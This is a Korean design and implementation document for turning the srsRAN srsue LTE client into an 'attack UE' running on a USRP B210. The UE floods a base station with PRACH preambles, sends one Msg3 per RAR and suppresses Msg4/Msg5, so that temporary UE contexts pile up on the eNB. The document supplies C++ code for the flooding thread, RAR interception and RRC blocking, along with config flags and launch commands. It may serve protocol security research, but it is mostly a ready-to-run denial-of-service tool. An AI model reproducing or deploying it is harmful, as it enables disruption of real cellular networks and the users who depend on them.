# srsue 공격용 미니 UE 설계 및 구현 문서

## 목차
1. [개요](#개요)
2. [전체 시스템 구조](#전체-시스템-구조)
3. [스레드 구조 및 동작 흐름](#스레드-구조-및-동작-흐름)
4. [구현 세부사항](#구현-세부사항)
5. [코드 구조](#코드-구조)
6. [사용 방법](#사용-방법)

---

## 개요

### 목적
srsue를 공격 실험용 미니 UE로 개조하여 다음 동작을 수행:
- **PRACH (Msg1) 주기적 송신**: RAPID를 순환/랜덤 선택하여 지속적으로 전송
- **RAR (Msg2) 수신 및 처리**: Downlink에서 RAR만 감지
- **Msg3 한 번 송신**: RAR 수신 시 해당 RAPID에 대해 RRCConnectionRequest 한 번만 전송
- **Msg4/Msg5 차단**: 이후 모든 절차 중단하여 eNB가 임시 UE 컨텍스트를 생성 후 타이머 만료로 삭제하도록 유도

### 핵심 특징
- **2-스레드 구조**: TX 스레드(PRACH 송신)와 RX 스레드(모니터링)
- **기존 코드 최소 수정**: 공격 모드와 일반 모드 공존
- **PHY Worker와의 통합**: USRP 하드웨어 제어와 백엔드 스레드 분리

---

## 전체 시스템 구조

### 계층별 구조

```
┌─────────────────────────────────────────────────────────────┐
│                    애플리케이션 레벨 (백엔드)                  │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │  MAC Layer                                              │ │
│  │  ┌───────────────────────────────────────────────────┐ │ │
│  │  │  attack_ue 클래스                                   │ │ │
│  │  │  ├─ TX Thread (PRACH 송신)                         │ │ │
│  │  │  ├─ RX Thread (모니터링)                            │ │ │
│  │  │  └─ attack_context (공유 상태)                      │ │ │
│  │  └───────────────────────────────────────────────────┘ │ │
│  │  ┌───────────────────────────────────────────────────┐ │ │
│  │  │  ra_proc (기존 RACH 절차)                         │ │ │
│  │  │  └─ 공격 모드일 때 RAR 콜백 전달                   │ │ │
│  │  └───────────────────────────────────────────────────┘ │ │
│  └─────────────────────────────────────────────────────────┘ │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │  RRC Layer                                              │ │
│  │  ┌───────────────────────────────────────────────────┐ │ │
│  │  │  - Msg4 (RRCConnectionSetup) 차단                 │ │ │
│  │  │  - Msg5 (RRCConnectionSetupComplete) 차단         │ │ │
│  │  └───────────────────────────────────────────────────┘ │ │
│  └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
                          │
                          │ PHY 인터페이스
                          ▼
┌─────────────────────────────────────────────────────────────┐
│              PHY Worker (USRP 하드웨어 제어)                  │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │  - PRACH 신호 생성 및 USRP로 전송                        │ │
│  │  - RAR 수신 및 디코딩                                    │ │
│  │  - MAC::tb_decoded() 콜백 호출                          │ │
│  └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
                          │
                          │ USRP B210
                          ▼
                    [공기 인터페이스]
```

### 데이터 흐름

#### 1. PRACH 송신 흐름 (TX Thread → PHY Worker → USRP)

```
TX Thread (attack_ue)
  │
  ├─> RAPID 선택 (순환: 0→1→2→...→63→0)
  │
  ├─> phy_h->prach_send(rapid, mask, power)
  │   │
  │   └─> PHY 인터페이스
  │       │
  │       └─> PHY Worker 스레드
  │           │
  │           ├─> prach::prepare_to_send()
  │           │   └─> mutex로 보호된 상태 저장
  │           │
  │           └─> prach::generate() (TTI 타이밍에 맞춰)
  │               │
  │               └─> USRP B210으로 전송
```

#### 2. RAR 수신 흐름 (USRP → PHY Worker → MAC → attack_ue)

```
USRP B210
  │
  ├─> RAR 수신 (RA-RNTI로 디코딩)
  │
  └─> PHY Worker 스레드
      │
      ├─> DL TB 디코딩 성공
      │
      └─> mac::tb_decoded(RA-RNTI, grant, ack)
          │
          └─> ra_proc::new_grant_dl() → ra_proc::tb_decoded_ok()
              │
              ├─> RAR PDU 파싱
              │
              └─> 공격 모드 체크
                  │
                  └─> attack_ue::on_rar_received(rapid, temp_crnti, grant)
                      │
                      ├─> RAPID → Temp C-RNTI 매핑 저장
                      │
                      └─> send_msg3_for_rapid()
                          │
                          ├─> phy_h->set_rar_grant()
                          ├─> rntis->set_temp_rnti()
                          └─> mux_unit->msg3_prepare()
```

#### 3. Msg3 송신 흐름

```
attack_ue::send_msg3_for_rapid()
  │
  ├─> mux_unit->msg3_prepare()
  │   │
  │   └─> MAC은 다음 UL grant에서 RLC CCCH 버퍼 확인
  │       │
  │       └─> RRCConnectionRequest가 있으면 MAC PDU에 포함
  │
  └─> PHY Worker가 UL grant에 따라 전송
      │
      └─> USRP B210으로 전송
```

---

## 스레드 구조 및 동작 흐름

### 스레드 계층 구조

```
┌─────────────────────────────────────────────────────────────┐
│  백엔드 스레드 (애플리케이션 레벨)                            │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │  Main Thread (srsue 메인)                              │ │
│  │  - 초기화 및 설정 관리                                  │ │
│  │  - MAC/RRC 초기화                                      │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │  TX Thread (attack_ue::tx_prach_thread)               │ │
│  │  - 독립 실행                                           │ │
│  │  - 주기적 PRACH 송신 (기본 20ms)                       │ │
│  │  - RAPID 순환 선택 (0~63)                              │ │
│  │  - phy_h->prach_send() 호출                            │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │  RX Thread (attack_ue::rx_rar_thread)                 │ │
│  │  - 모니터링 목적 (실제 RAR는 PHY worker에서 처리)      │ │
│  │  - 주기적 상태 확인 (100ms)                             │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │  RRC Thread                                            │ │
│  │  - RRC 메시지 처리                                      │ │
│  │  - 공격 모드일 때 Msg4/Msg5 차단                       │ │
│  └───────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
                          │
                          │ PHY 인터페이스 (스레드 안전)
                          ▼
┌─────────────────────────────────────────────────────────────┐
│  PHY Worker 스레드 (USRP 하드웨어 제어)                     │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │  PHY Worker Pool                                      │ │
│  │  - TTI 단위로 실행 (1ms)                              │ │
│  │  - PRACH 신호 생성 및 전송                            │ │
│  │  - DL 신호 수신 및 디코딩                             │ │
│  │  - MAC 콜백 호출 (tb_decoded)                         │ │
│  └───────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
                          │
                          │ USRP API
                          ▼
                    [USRP B210 하드웨어]
```

### 동작 시퀀스 다이어그램

```
시간 ───────────────────────────────────────────────────────>

TX Thread:
  │
  ├─> PRACH(RAPID=0) ──┐
  │                     │
  ├─> sleep(20ms)       │
  │                     │
  ├─> PRACH(RAPID=1) ──┤
  │                     │
  ├─> sleep(20ms)       │
  │                     │
  └─> PRACH(RAPID=2) ──┘
                        │
                        ▼
PHY Worker:
                        │
                        ├─> PRACH 신호 생성
                        │
                        ├─> USRP로 전송
                        │
                        └─> DL 수신 대기
                            │
                            ▼
                        RAR 수신 (RA-RNTI)
                            │
                            ├─> 디코딩 성공
                            │
                            └─> mac::tb_decoded()
                                │
                                ▼
MAC (ra_proc):
                                │
                                ├─> tb_decoded_ok()
                                │
                                ├─> RAR 파싱
                                │
                                └─> 공격 모드 체크
                                    │
                                    └─> attack_ue::on_rar_received()
                                        │
                                        ▼
attack_ue:
                                        │
                                        ├─> send_msg3_for_rapid()
                                        │
                                        ├─> set_rar_grant()
                                        ├─> set_temp_rnti()
                                        └─> msg3_prepare()
                                            │
                                            ▼
                                        Msg3 전송 (RRCConnectionRequest)
                                            │
                                            ▼
                                        eNB: Temp UE Context 생성
                                            │
                                            ▼
                                        [타이머 만료 대기...]
                                            │
                                            ▼
                                        eNB: Temp UE Context 삭제
```

---

## 구현 세부사항

### 1. attack_ue 클래스 구조

#### 헤더 파일 (`attack_ue.h`)

```cpp
class attack_ue {
public:
  // 초기화 및 제어
  void init(phy_interface_mac_lte* phy_h, 
            rrc_interface_mac* rrc_h, 
            mux* mux_unit, 
            ue_rnti* rntis, 
            class rrc* rrc_ptr = nullptr);
  
  void start();  // TX/RX 스레드 시작
  void stop();   // TX/RX 스레드 중지
  
  // 설정
  void set_attack_mode(bool enabled);
  void set_prach_period_ms(uint32_t period_ms);
  void set_nof_preambles(uint32_t nof_preambles);
  
  // RAR 수신 콜백 (PHY worker에서 호출)
  void on_rar_received(uint32_t rapid, 
                       uint16_t temp_crnti, 
                       uint8_t grant[SRSRAN_RAR_GRANT_LEN]);
  
  // 상태 확인
  bool is_attack_mode_enabled() const;

private:
  // 스레드 함수
  void tx_prach_thread();  // PRACH 주기적 송신
  void rx_rar_thread();    // 모니터링 (실제 RAR는 PHY에서)
  
  // Msg3 송신
  void send_msg3_for_rapid(uint32_t rapid, 
                           uint16_t temp_crnti, 
                           uint8_t grant[SRSRAN_RAR_GRANT_LEN]);
  
  // 공유 상태
  struct attack_context {
    std::mutex mutex;
    std::map<uint32_t, uint16_t> rapid_to_temp_crnti;  // RAPID → Temp C-RNTI
    std::map<uint32_t, bool> msg3_sent;                // RAPID별 Msg3 송신 여부
    std::set<uint32_t> active_rapids;                   // 활성 RAPID 목록
    uint32_t prach_period_ms = 20;                      // PRACH 송신 주기 (ms)
    uint32_t nof_preambles = 64;                        // 사용 가능한 preamble 수
  } ctx;
  
  // 스레드 제어
  std::atomic<bool> running;
  std::atomic<bool> attack_mode_enabled;
  std::thread tx_thread;
  std::thread rx_thread;
  
  // 인터페이스 포인터
  phy_interface_mac_lte* phy_h;
  rrc_interface_mac* rrc_h;
  mux* mux_unit;
  ue_rnti* rntis;
  class rrc* rrc_ptr;
  
  // PRACH 설정
  std::atomic<uint32_t> current_rapid;
  uint32_t sel_mask_index;
};
```

### 2. TX 스레드 구현

```cpp
void attack_ue::tx_prach_thread()
{
  logger.info("TX PRACH thread started");
  
  while (running.load() && attack_mode_enabled.load()) {
    // RAPID 순환 선택 (0 → 1 → 2 → ... → 63 → 0)
    uint32_t rapid = current_rapid.load();
    uint32_t next_rapid = (rapid + 1) % ctx.nof_preambles;
    current_rapid.store(next_rapid);
    
    // PRACH 송신 요청 (PHY 인터페이스를 통해)
    float target_power_dbm = -100.0f;
    phy_h->prach_send(rapid, sel_mask_index, target_power_dbm);
    
    logger.info("TX: Sent PRACH preamble %d", rapid);
    
    // 활성 RAPID 목록에 추가
    {
      std::lock_guard<std::mutex> lock(ctx.mutex);
      ctx.active_rapids.insert(rapid);
    }
    
    // 주기 대기 (기본 20ms)
    std::this_thread::sleep_for(
      std::chrono::milliseconds(ctx.prach_period_ms)
    );
  }
  
  logger.info("TX PRACH thread stopped");
}
```

**특징:**
- 백엔드 스레드에서 독립 실행
- `phy_h->prach_send()`는 PHY 인터페이스를 통해 요청
- 실제 PRACH 신호 생성 및 전송은 PHY Worker에서 TTI 타이밍에 맞춰 처리
- `prach::prepare_to_send()`는 mutex로 보호되어 스레드 안전

### 3. RAR 수신 및 처리

#### proc_ra.cc에서의 RAR 콜백 연결

```cpp
void ra_proc::tb_decoded_ok(const uint8_t cc_idx, const uint32_t tti)
{
  // ... RAR PDU 파싱 ...
  
  while (rar_pdu_msg.next()) {
    // 공격 모드일 때는 모든 RAR를 attack_ue에 전달
    if (attack_ue_ptr && attack_ue_ptr->is_attack_mode_enabled()) {
      if (rar_pdu_msg.get()->has_rapid()) {
        uint32_t rapid = rar_pdu_msg.get()->get_rapid();
        uint16_t temp_crnti = rar_pdu_msg.get()->get_temp_crnti();
        uint8_t grant[srsran::rar_subh::RAR_GRANT_LEN] = {};
        rar_pdu_msg.get()->get_sched_grant(grant);
        
        // 공격 모드: attack_ue에 RAR 정보 전달
        attack_ue_ptr->on_rar_received(rapid, temp_crnti, grant);
      }
    }
    
    // 기존 로직: sel_preamble과 일치하는 RAR만 처리
    if (rar_pdu_msg.get()->has_rapid() && 
        rar_pdu_msg.get()->get_rapid() == sel_preamble) {
      // ... 기존 RACH 절차 ...
    }
  }
}
```

#### attack_ue에서의 RAR 처리

```cpp
void attack_ue::on_rar_received(uint32_t rapid, 
                                uint16_t temp_crnti, 
                                uint8_t grant[SRSRAN_RAR_GRANT_LEN])
{
  std::lock_guard<std::mutex> lock(ctx.mutex);
  
  // 이미 Msg3를 보낸 RAPID인지 확인
  if (ctx.msg3_sent.find(rapid) != ctx.msg3_sent.end() && 
      ctx.msg3_sent[rapid]) {
    logger.debug("RAPID %d: Msg3 already sent, ignoring RAR", rapid);
    return;
  }
  
  // 매핑 저장
  ctx.rapid_to_temp_crnti[rapid] = temp_crnti;
  ctx.active_rapids.insert(rapid);
  
  logger.info("RX: RAR received for RAPID %d, Temp C-RNTI=0x%x", 
              rapid, temp_crnti);
  
  // Msg3 송신
  send_msg3_for_rapid(rapid, temp_crnti, grant);
  
  ctx.msg3_sent[rapid] = true;
}
```

### 4. Msg3 송신 구현

```cpp
void attack_ue::send_msg3_for_rapid(uint32_t rapid, 
                                    uint16_t temp_crnti, 
                                    uint8_t grant[SRSRAN_RAR_GRANT_LEN])
{
  logger.info("Sending Msg3 for RAPID %d (Temp C-RNTI=0x%x)", 
              rapid, temp_crnti);
  
  // 1. RAR grant 설정 (PHY에)
  phy_h->set_rar_grant(grant, temp_crnti);
  
  // 2. Temp C-RNTI 설정
  if (rntis) {
    rntis->set_temp_rnti(temp_crnti);
  }
  
  // 3. Msg3 MAC PDU 준비
  mux_unit->msg3_prepare();
  
  // NOTE: mux_unit->msg3_prepare()가 호출되면, MAC은 다음 UL grant에서
  // RLC의 CCCH (LCID=0) 버퍼를 확인하여 RRCConnectionRequest를 전송합니다.
  // RLC 버퍼에 이미 메시지가 있다면 자동으로 전송됩니다.
  
  logger.info("Msg3 prepared for RAPID %d", rapid);
}
```

### 5. Msg4/Msg5 차단

#### RRC에서의 Msg4 차단 (`rrc.cc`)

```cpp
void rrc::parse_dl_ccch(unique_byte_buffer_t pdu)
{
  // ... 메시지 파싱 ...
  
  case dl_ccch_msg_type_c::c1_c_::types::rrc_conn_setup: {
    if (mac->is_attack_mode_enabled()) {
      logger.info("Attack mode: Ignoring RRCConnectionSetup (Msg4).");
      break;
    }
    // ... 기존 처리 ...
  }
}

void rrc::handle_con_setup(const rrc_conn_setup_s& setup)
{
  if (mac->is_attack_mode_enabled()) {
    logger.info("Attack mode: handle_con_setup bypassed.");
    return;
  }
  // ... 기존 처리 ...
}
```

#### RRC에서의 Msg5 차단 (`rrc_procedures.cc`)

```cpp
srsran::proc_outcome_t rrc::connection_setup_proc::react(
    const bool& config_complete)
{
  // ... 설정 완료 처리 ...
  
  if (rrc_ptr->mac->is_attack_mode_enabled()) {
    logger.info("Attack mode: Not sending RRCConnectionSetupComplete (Msg5).");
    return proc_outcome_t::success;
  }
  
  rrc_ptr->send_con_setup_complete(std::move(dedicated_info_nas));
  return proc_outcome_t::success;
}
```

#### RACH 절차에서의 완료 차단 (`proc_ra.cc`)

```cpp
bool ra_proc::contention_resolution_id_received_nolock(uint64_t rx_contention_id)
{
  // ... Contention Resolution 확인 ...
  
  if (transmitted_contention_id == rx_contention_id) {
    uecri_successful = true;
    if (!mac_h->is_attack_mode_enabled()) {
      complete();
    } else {
      rInfo("Attack mode: Contention Resolution successful, but not completing RA procedure.");
    }
  }
  // ...
}

void ra_proc::pdcch_to_crnti(bool is_new_uplink_transmission)
{
  // ... PDCCH to C-RNTI 처리 ...
  
  if ((!started_by_pdcch && is_new_uplink_transmission) || started_by_pdcch) {
    contention_resolution_timer.stop();
    if (!mac_h->is_attack_mode_enabled()) {
      complete();
    } else {
      rInfo("Attack mode: PDCCH to C-RNTI received, but not completing RA procedure.");
    }
  }
}
```

---

## 코드 구조

### 파일 구조

```
srsue/
├── hdr/stack/mac/
│   ├── attack_ue.h          # attack_ue 클래스 선언
│   ├── mac.h                # MAC 클래스 (attack_ue 통합)
│   └── proc_ra.h             # RACH 절차 (attack_ue 포인터 추가)
│
├── src/stack/mac/
│   ├── attack_ue.cc          # attack_ue 클래스 구현
│   ├── mac.cc                # MAC 구현 (attack_ue 초기화 및 제어)
│   └── proc_ra.cc            # RACH 절차 (RAR 콜백 연결)
│
└── src/stack/rrc/
    ├── rrc.cc                # RRC 구현 (Msg4 차단)
    └── rrc_procedures.cc     # RRC 절차 (Msg5 차단)
```

### MAC 계층 통합

#### mac.h 수정

```cpp
class mac : public mac_interface_phy_lte,
            public mac_interface_rrc,
            // ...
{
public:
  // ... 기존 메서드 ...
  
  /*********** Attack UE mode ******************/
  void set_attack_mode(bool enabled);
  void set_attack_prach_period_ms(uint32_t period_ms);
  bool is_attack_mode_enabled() const;

private:
  // ... 기존 멤버 ...
  
  /* Attack UE mode */
  attack_ue attack_ue_instance;
  std::atomic<bool> attack_mode_enabled;
};
```

#### mac.cc 수정

```cpp
bool mac::init(phy_interface_mac_lte* phy, 
               rlc_interface_mac* rlc, 
               rrc_interface_mac* rrc)
{
  // ... 기존 초기화 ...
  
  // Initialize attack UE instance
  attack_ue_instance.init(phy_h, rrc, &mux_unit, &uernti, nullptr);
  
  // ...
}

void mac::set_attack_mode(bool enabled)
{
  attack_mode_enabled = enabled;
  if (enabled) {
    attack_ue_instance.start();
    logger.info("Attack mode enabled");
  } else {
    attack_ue_instance.stop();
    logger.info("Attack mode disabled");
  }
}

bool mac::is_attack_mode_enabled() const
{
  return attack_mode_enabled.load();
}
```

---

## 사용 방법

### 1. 설정 파일을 통한 공격 모드 활성화

`ue.conf` 설정 파일에 다음 섹션을 추가:

```ini
#####################################################################
# MAC Attack Mode configuration
#
# attack_mode: Enable attack mode (flooding UE) (true/false)
# attack_prach_period_ms: PRACH transmission period in attack mode (ms)
#####################################################################
[mac]
attack_mode = true
attack_prach_period_ms = 20
```

그리고 srsue 실행:
```bash
./srsue ue.conf
```

### 2. 명령줄 인자를 통한 공격 모드 활성화

설정 파일 없이 명령줄 인자로 직접 설정:

```bash
./srsue --mac.attack_mode=true --mac.attack_prach_period_ms=20 ue.conf
```

또는 설정 파일과 함께 사용 (명령줄 인자가 우선):

```bash
./srsue --mac.attack_mode=true --mac.attack_prach_period_ms=20 ue.conf
```

### 3. 공격 모드 비활성화

설정 파일에서 `attack_mode = false`로 설정하거나, 명령줄에서:

```bash
./srsue --mac.attack_mode=false ue.conf
```

### 3. 동작 방식

#### 공격 모드 활성화 시:
1. **TX 스레드 시작**: PRACH를 주기적으로 송신 (기본 20ms)
2. **RAR 모니터링**: PHY worker에서 RAR 수신 시 자동으로 `attack_ue::on_rar_received()` 호출
3. **Msg3 자동 송신**: RAR 수신 시 해당 RAPID에 대해 Msg3 한 번만 전송
4. **Msg4/Msg5 차단**: RRC에서 Msg4/Msg5 처리 무시

#### 공격 모드 비활성화 시:
- 기존 srsue 동작과 동일 (정상 RACH 절차 수행)

### 4. 설정 파라미터

- **PRACH 송신 주기**: `set_attack_prach_period_ms(uint32_t period_ms)`
  - 기본값: 20ms
  - 범위: 1ms 이상 권장

- **Preamble 수**: `set_nof_preambles(uint32_t nof_preambles)`
  - 기본값: 64
  - 범위: 1~64

### 5. 로그 확인

공격 모드 관련 로그는 `ATTACK_UE` 로거를 통해 확인:

```
[ATTACK_UE] Attack UE started (PRACH period=20 ms, nof_preambles=64)
[ATTACK_UE] TX: Sent PRACH preamble 0 (mask=0, power=-100.0 dBm)
[ATTACK_UE] RX: RAR received for RAPID 0, Temp C-RNTI=0x1234
[ATTACK_UE] Sending Msg3 for RAPID 0 (Temp C-RNTI=0x1234)
[ATTACK_UE] Msg3 prepared for RAPID 0
```

---

## 주요 설계 결정 사항

### 1. 스레드 분리
- **TX/RX 스레드**: 백엔드에서 독립 실행
- **PHY Worker**: USRP와 직접 통신하는 하드웨어 제어 스레드
- **인터페이스 통신**: PHY 인터페이스를 통해 스레드 간 통신

### 2. 기존 코드 최소 수정
- 공격 모드와 일반 모드 공존
- 조건부 체크 (`is_attack_mode_enabled()`)로 동작 분기
- 기존 state machine 유지

### 3. RAR 콜백 메커니즘
- PHY worker에서 RAR 수신 시 `proc_ra::tb_decoded_ok()` 호출
- 공격 모드일 때 `attack_ue::on_rar_received()` 콜백 전달
- 모든 RAPID에 대해 처리 (sel_preamble과 무관)

### 4. Msg4/Msg5 차단
- RRC 계층에서 조건부 체크로 차단
- 타이머는 정상 동작하지만 상태 전환은 차단
- eNB는 타이머 만료로 임시 UE 컨텍스트 삭제

---

## 주의사항 및 제한사항

### 1. 타이밍
- PRACH 송신 주기는 PHY worker의 TTI 타이밍과 독립적
- 실제 PRACH 전송은 PHY worker가 TTI에 맞춰 처리
- RAR 윈도우는 eNB 설정에 따라 다를 수 있음

### 2. 동기화
- `attack_context`는 mutex로 보호
- PHY 인터페이스 호출은 스레드 안전
- `prach::prepare_to_send()`는 mutex로 보호됨

### 3. RRC 메시지
- 현재 구현에서는 RLC 버퍼에 이미 RRCConnectionRequest가 있어야 Msg3가 전송됨
- 완전한 자동화를 위해서는 RRC에서 connection_request() 호출 필요

### 4. 하드웨어 제약
- USRP B210 하나만 사용
- TX/RX는 동일 안테나 사용

---

## 향후 개선 사항

1. **RRC 메시지 자동 생성**: RAR 수신 시 자동으로 RRCConnectionRequest 생성
2. **랜덤 RAPID 선택**: 순환 방식 외에 랜덤 선택 옵션 추가
3. **통계 수집**: 송신한 PRACH 수, 수신한 RAR 수, 전송한 Msg3 수 등
4. **동적 주기 조정**: 네트워크 상태에 따라 PRACH 송신 주기 자동 조정

---

## 참고 자료

- srsRAN 공식 문서: https://docs.srsran.com/
- 3GPP TS 36.321: Medium Access Control (MAC) protocol specification
- 3GPP TS 36.331: Radio Resource Control (RRC) protocol specification
